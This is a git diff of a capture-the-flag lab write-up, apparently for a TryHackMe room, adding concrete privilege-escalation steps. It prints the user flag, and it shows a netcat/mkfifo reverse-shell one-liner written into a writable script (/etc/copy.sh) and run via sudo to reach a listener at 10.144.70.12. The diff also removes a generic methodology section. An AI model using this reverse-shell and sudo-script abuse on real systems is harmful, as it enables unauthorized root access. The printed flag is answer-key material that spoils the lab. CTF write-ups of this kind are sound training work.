@@ -259,156 +259,87 @@ Read the user flag:
 
 cat user.txt
 
-# THM{63e5bce9271952aad1113b6f1ac28a07}
+**THM{63e5bce9271952aad1113b6f1ac28a07}**
+
+
+## Privilege Escalation##
+
+Now, let's check if we can escalate our privileges:
+
+```bash
+sudo -l
 ```
+
+We find:
+
+```text
+/usr/bin/perl /home/itguy/backup.pl
+```
+
+Let's inspect the script:
+
+```bash
+cat /home/itguy/backup.pl
+```
+
+We can see that it uses `/etc/copy.sh`.
+
 ---
+<img width="982" height="187" alt="image" src="https://github.com/user-attachments/assets/be232a7c-f987-4d96-a53b-ac635636210a" />
 
-## 13. Privilege Escalation Enumeration
+Here are the updated step-by-step instructions in English with your listener IP (`10.144.70.12`) inserted:
 
-Begin local privilege escalation enumeration.
+1. **Check Write Permissions for `/etc/copy.sh**`
+Verify whether the `www-data` user has write access to the target script:
+```bash
+ls -l /etc/copy.sh
 
-First, check the current user:
+```
 
+
+2. **Inject a Payload into `copy.sh**`
+Overwrite `/etc/copy.sh` with a reverse shell payload configured with your IP (`10.144.70.12`) and target port (e.g., `4444`):
+```bash
+echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.144.70.12 4444 >/tmp/f" > /etc/copy.sh
+
+```
+
+
+3. **Start a Netcat Listener**
+Open a terminal on your machine (`10.144.70.12`) and listen on your selected port:
+```bash
+nc -lvnp 4444
+
+```
+
+
+4. **Execute the Sudo Command**
+Trigger the Perl script with root privileges from the target machine:
+```bash
+sudo /usr/bin/perl /home/itguy/backup.pl
+
+```
+
+
+5. **Verify Root Privileges**
+Once executed, the script triggers the reverse shell back to `10.144.70.12`. Confirm your root access:
 ```bash
 whoami
+
 ```
+<img width="1926" height="775" alt="image" src="https://github.com/user-attachments/assets/7e75466a-6943-42a4-9bf4-dd1020795270" />
 
-```bash
-id
-```
 
-Then inspect sudo permissions:
+1. **`nc -lvnp 9001`** → **Start the initial reverse shell listener.**
+2. **`sudo -l`** → **Check available sudo privileges.**
+3. **`cat /home/itguy/backup.pl`** → **Inspect the privileged Perl script.**
+4. **`ls -l /etc/copy.sh`** → **Check the script permissions.**
+5. **Payload + `sudo ... backup.pl`** → **Modify the writable script and execute it with sudo.**
+6. **`nc -lvnp 4444`** → **Start a second listener for the privileged shell.**
+7. **`whoami` → `root`** → **Confirm successful privilege escalation.**
+8. **`cat root.txt`** → **Retrieve the root flag.**
 
-```bash
-sudo -l
-```
 
-Look for:
-
-* Commands executable as root
-* `NOPASSWD` entries
-* Dangerous binaries
-* Misconfigured sudo permissions
-
-Example:
-
-```text
-User → sudo -l → Misconfiguration → Privilege Escalation
-```
-
----
-
-## 14. Privilege Escalation
-
-If `sudo -l` reveals a vulnerable or misconfigured binary, research whether it can be abused for privilege escalation.
-
-A useful reference is **GTFOBins**.
-
-```text
-sudo -l
-   ↓
-Identify Allowed Binary
-   ↓
-GTFOBins
-   ↓
-Privilege Escalation
-   ↓
-Root
-```
-
-After exploiting the identified misconfiguration, verify your privileges:
-
-```bash
-whoami
-```
-
-Expected result:
-
-```text
-root
-```
-
-You can also verify with:
-
-```bash
-id
-```
-
----
-
-## 15. Root Flag
-
-Once root access is obtained, locate the root flag.
-
-```bash
-find / -type f -name "root.txt" 2>/dev/null
-```
-
-Then read it:
-
-```bash
-cat /root/root.txt
-```
-
-### Result
-
-```text
-Root Flag: __________________
-```
-
----
-
-# Attack Path Summary
-
-```text
-Nmap Enumeration
-       ↓
-Web Enumeration
-       ↓
-Directory Brute Force
-       ↓
-Backup File Discovered
-       ↓
-Credential Extraction
-       ↓
-Hash Cracking
-       ↓
-Authenticated Login
-       ↓
-File Upload / RCE
-       ↓
-Reverse Shell
-       ↓
-User Access
-       ↓
-sudo -l
-       ↓
-Misconfiguration
-       ↓
-Privilege Escalation
-       ↓
-ROOT
-```
-
----
-
-## Key Takeaways
-
-This lab demonstrates how multiple small security weaknesses can be chained together into a complete compromise.
-
-```text
-Information Disclosure
-        +
-Weak Credential Storage
-        +
-Insecure File Upload
-        +
-Sudo Misconfiguration
-        =
-Full System Compromise
-```
-
-The most important lesson is to **enumerate carefully and follow the evidence**. A simple exposed backup file can become the starting point for complete system compromise.
 
 
 
